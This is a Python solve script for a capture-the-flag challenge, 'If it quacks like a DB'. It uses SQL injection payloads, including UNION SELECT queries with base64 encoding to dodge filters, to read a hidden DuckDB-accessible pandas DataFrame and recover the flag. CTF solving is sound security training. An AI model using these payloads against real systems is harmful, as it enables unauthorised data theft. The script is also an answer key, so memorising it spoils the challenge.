#!/usr/bin/env python3
"""
Exploit script for "If it quacks like a DB" challenge

This script demonstrates SQL injection in DuckDB to access
pandas DataFrames that are in scope, using base64 encoding
and current_query() for exfiltration.
"""

import requests
import sys
import re
import base64

def exploit(base_url):
    """
    Exploit the SQL injection vulnerability to extract the flag
    using base64 encoding and pandas DataFrame access.
    """
    print(f"[*] Target: {base_url}")
    print("[*] Testing connection...")

    # Test basic connectivity
    try:
        response = requests.get(f"{base_url}/health", timeout=5)
        if response.status_code == 200:
            print(f"[+] Server is up! Running {response.json()}")
        else:
            print(f"[-] Server responded with status {response.status_code}")
            return None
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return None

    print("\n[*] Step 1: Testing basic SQL injection...")

    # Test basic SQL injection
    payload1 = "' OR 1=1 --"
    response = requests.post(
        f"{base_url}/search",
        json={"query": payload1},
        timeout=5
    )

    if response.status_code == 200:
        print("[+] Basic SQL injection works!")
    else:
        print(f"[-] Unexpected response: {response.status_code}")
        print(response.text)

    print("\n[*] Step 2: Extracting flag hint using base64 encoding and current_query()...")
    print("[*] Using DuckDB's base64() function to encode and exfiltrate the flag hint!")

    # Use base64 encoding to bypass filters
    # We'll encode the description field which contains the flag hint
    # Note: base64() requires BLOB type, so we cast the description
    payload_hint = "' UNION SELECT id, base64(description::BLOB), category, price, name FROM products WHERE id = 7 --"

    response = requests.post(
        f"{base_url}/search",
        json={"query": payload_hint},
        timeout=5
    )

    flag_hint = None
    if response.status_code == 200:
        data = response.json()
        if 'products' in data and data['products']:
            for product in data['products']:
                # The base64-encoded description is now in the 'name' field
                encoded_name = product.get('name', '')
                if encoded_name:
                    try:
                        # Decode the base64-encoded description
                        decoded = base64.b64decode(encoded_name).decode('utf-8')
                        if 'Wow! Making so much progress:' in decoded:
                            flag_hint = decoded.split('Wow! Making so much progress: ')[-1]
                            print(f"[+] Decoded base64 description: {decoded}")
                            print(f"[+] Extracted flag hint: {flag_hint}")
                            break
                    except Exception as e:
                        continue

    if not flag_hint:
        print("[-] Could not extract flag hint using base64")
        return None

    print("\n[*] Step 3: Attempting to access pandas DataFrame...")
    print("[*] DuckDB can directly reference pandas DataFrames in SQL queries!")

    # The key exploit: DuckDB allows referencing pandas DataFrames
    # The application has a DataFrame called 'flag_data' in scope
    payload2 = "' UNION SELECT id, secret_type, secret_value, NULL, NULL FROM flag_data --"

    response = requests.post(
        f"{base_url}/search",
        json={"query": payload2},
        timeout=5
    )

    flag_part2 = None
    if response.status_code == 200:
        data = response.json()
        if 'products' in data and data['products']:
            print("[+] Successfully accessed flag_data DataFrame!")
            print("\n[*] Retrieved data:")

            for product in data['products']:
                # The DataFrame columns map to product fields
                secret_type = product.get('name', '')
                secret_value = product.get('category', '')

                print(f"    - {secret_type}: {secret_value}")

                if 'flag' in secret_type.lower():
                    flag_part2 = secret_value

    if not flag_part2:
        print("\n[-] Could not extract second part of flag from DataFrame")
        return None

    # Combine the two parts
    full_flag = flag_hint + flag_part2
    print(f"\n[+] FLAG FOUND: {full_flag}")
    return full_flag

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 solve.py <base_url>")
        print("Example: python3 solve.py http://localhost:5000")
        sys.exit(1)

    base_url = sys.argv[1].rstrip('/')

    print("=" * 60)
    print("If it quacks like a DB - Exploit Script")
    print("=" * 60)

    flag = exploit(base_url)

    if flag:
        print("\n" + "=" * 60)
        print("SUCCESS!")
        print("=" * 60)
        sys.exit(0)
    else:
        print("\n" + "=" * 60)
        print("FAILED!")
        print("=" * 60)
        sys.exit(1)

if __name__ == '__main__':
    main()
